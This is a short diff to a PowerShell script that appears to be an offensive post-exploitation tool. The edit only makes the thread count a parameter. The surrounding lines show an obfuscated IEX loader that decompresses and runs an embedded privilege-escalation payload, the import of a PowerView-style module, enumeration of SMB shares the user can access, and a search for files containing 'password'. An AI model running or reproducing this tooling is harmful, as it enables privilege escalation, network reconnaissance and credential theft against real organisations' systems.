@@ -1,4 +1,6 @@
-Write-Host '                                                                              
+Param([Int32]$threads=20)
+
+Write-Host '
   ______   _______    ______   _______   ________ 
  /      \ |       \  /      \ |       \ |        \
 |  $$$$$$\| $$$$$$$\|  $$$$$$\| $$$$$$$\| $$$$$$$$
@@ -122,7 +124,7 @@ $PrivEsc='IEX ( nEw-OBJEct sYstEM.iO.StrEaMREAdEr(( nEw-OBJEct iO.coMPRESsioN.dE
 			Write-Host "Importing module..."
 			Import-Module PView.psm1
 			Write-Host "Searching for SMB Shares..." -ForegroundColor Yellow
-			Invoke-ShareFinder -CheckShareAccess -Threads 20 | Out-File $path\ShareFinder.txt
+			Invoke-ShareFinder -CheckShareAccess -Threads $threads | Out-File $path\ShareFinder.txt
 			Write-Host "Looking for sensitive files (Grab a coffee, this might take awhile)" -ForegroundColor Yellow
 #Edit the terms if you want to look for different strings in files. Comment out this cmdlet if it takes too long.
 			Invoke-FileFinder -Verbose -Terms password -OutFile $path\FileFinder.txt
